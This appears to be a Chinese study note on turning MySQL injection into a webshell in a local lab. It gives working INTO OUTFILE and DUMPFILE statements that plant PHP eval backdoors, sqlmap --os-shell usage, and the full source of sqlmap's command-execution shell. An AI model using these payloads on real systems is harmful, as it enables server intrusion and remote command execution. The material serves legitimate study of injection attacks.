MYSQL注入 GETSHELL

 

看到mysql写shell的语句有挺多的，学一下记录下来

**0x01 利用条件**

[TABLE]

**0x02 写shell语句**

| 1   | show global variables like '%secure_file_priv%';        #查看可以写入的位置 |
|-----|-----------------------------------------------------------------------------|

 

5.7.26为null，5.5.29为空

![image-20240410161844061](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946877.png)

这里用的是5.5.29版本默认为空，可以写入任何地方，当然目录需要有写的权限

 

![image-20240410161859475](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946878.png)

 

**into outfile / into dumpfile**

 

**UNION SELECT**

最简单的联合查询写入

| 1   | select \* from users where id=-1 union select 1,2,'\<?php eval(\$\_POST\[\\pass\\\]); ?\>' **into outfile** 'D:\\phpstudy_pro\\WWW\\shell.php'; |
|-----|-------------------------------------------------------------------------------------------------------------------------------------------------|

 

![image-20240410161911064](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946879.png)

写入的文件是这样的

**lines terminated by**

| 1   | select \* from users where id=1 into outfile 'D:\\phpstudy_pro\\WWW\\shell.php' lines terminated by '\<?php eval(\$\_POST\[\\pass\\\]); ?\>'; |
|-----|-----------------------------------------------------------------------------------------------------------------------------------------------|

注意这里一定要用一个可以查询到的值，不然写文件会为空

![image-20240410162105241](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946880.png)

**lines starting by**

 

| 1   | select \* from users where id=1 into outfile 'D:\\phpstudy_pro\\WWW\\shell.php' lines starting by '\<?php eval(\$\_POST\[\\pass\\\]); ?\>'; |
|-----|---------------------------------------------------------------------------------------------------------------------------------------------|

 ![image-20240410162117508](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946881.png)



**fields terminated by**

 

| 1   | select \* from users where id=1 into outfile 'D:\\phpstudy_pro\\WWW\\shell.php' fields terminated by '\<?php eval(\$\_POST\[\\pass\\\]); ?\>'; |
|-----|------------------------------------------------------------------------------------------------------------------------------------------------|

 

![image-20240410162128321](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946882.png)

**COLUMNS terminated by**

 

| 1   | select \* from users where id=1 into outfile 'D:\\phpstudy_pro\\WWW\\shell.php' COLUMNS terminated by '\<?php eval(\$\_POST\[\\pass\\\]); ?\>'; |
|-----|-------------------------------------------------------------------------------------------------------------------------------------------------|

 

![image-20240410162140176](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946883.png)

写入文件结果和上面的方法一样

**0x03 outfile和dumpfile的区别**

简单的说outfile写完会有脏数据，dumpfile可以做到没有脏数据，所以在写udf的时候是用dumpfile的

上面已经写过outfile了，下面直接演示dumpfile

| 1   | select \* from users where id=-1 union select '','','\<?php eval(\$\_POST\[\\pass\\\]); ?\>' into dumpfile 'D:\\phpstudy_pro\\WWW\\shell.php'; |
|-----|------------------------------------------------------------------------------------------------------------------------------------------------|

 

![image-20240410162204353](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946884.png)

 

| 1   | select \* from users where id=1 union select 1,2,'\<?php eval(\$\_POST\[\\pass\\\]); ?\>' into dumpfile 'D:\\phpstudy_pro\\WWW\\shell.php'; |
|-----|---------------------------------------------------------------------------------------------------------------------------------------------|

 

![image-20240410162233308](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946885.png)

可以看到这个是带着数据的，里面有查询出来的数据和自己写的12，所以只要让查询为空，然后union select后面接着的数据为空就可以达到干净的文件的效果

**0x04 日志getshell**

![image-20240410162324527](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946886.png) 

![image-20240410162251997](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946887.png)

修改好之后是这样的

![image-20240410162336044](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946888.png)

然后执行语句

![image-20240410162346222](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946889.png)

查看日志文件

![image-20240410162404205](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946890.png)

已经将webshell写入网站根目录了

 

 

 

 

--os-shell

原理

 

--os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件

 

此为sqlmap的一个命令，利用这条命令的先决条件：

 

1、要求为DBA，--is-dba（phpstudy搭建的一般为DBA）

2、secure_file_priv没有具体值

3、知道网站的绝对路径

4、GPC为off，php主动转义的功能关闭

 

使用

 

我们以sqli-labs第一关为例

 

sqlmap -u [*http://192.168.43.145/2_Shotting_Range/sql/Less-1/?id=1*](http://192.168.43.145/2_Shotting_Range/sql/Less-1/?id=1) --os-shell

 

![image-20240410162418399](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946891.png)

 

sqlmap在指定的目录生成了两个文件（文件名是随机的，并不是固定的）：

 

tmpbeewq.php 用来执行系统命令

tmpuqvgw.php 用来上传文件

![image-20240410162429046](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946892.png)

 

1\. tmpbeewq.php的文件内容为

 

\<?php \$c=\$\_REQUEST\["cmd"\];@set_time_limit(0);@ignore_user_abort(1);@ini_set("max_execution_time",0);\$z=@ini_get("disable_functions");if(!empty(\$z)){\$z=preg_replace("/\[, \]+/",',',\$z);\$z=explode(',',\$z);\$z=array_map("trim",\$z);}else{\$z=array();}\$c=\$c." 2\>&1\n";function f(\$n){global \$z;return is_callable(\$n)and!in_array(\$n,\$z);}if(f("system")){ob_start();system(\$c);\$w=ob_get_clean();}elseif(f("proc_open")){\$y=proc_open(\$c,array(array(pipe,r),array(pipe,w),array(pipe,w)),\$t);\$w=NULL;while(!feof(\$t\[1\])){\$w.=fread(\$t\[1\],512);}@proc_close(\$y);}elseif(f("shell_exec")){\$w=shell_exec(\$c);}elseif(f("passthru")){ob_start();passthru(\$c);\$w=ob_get_clean();}elseif(f("popen")){\$x=popen(\$c,r);\$w=NULL;if(is_resource(\$x)){while(!feof(\$x)){\$w.=fread(\$x,512);}}@pclose(\$x);}elseif(f("exec")){\$w=array();exec(\$c,\$w);\$w=join(chr(10),\$w).chr(10);}else{\$w=0;}echo"\<pre\>\$w\</pre\>";?\>

 

访问目标

 

![image-20240410162444539](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946893.png)

 

使用tmpuqvgw.php上传文件

 

我们上传一个php的一句话后门

![image-20240410162452197](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946894.png)

 

 
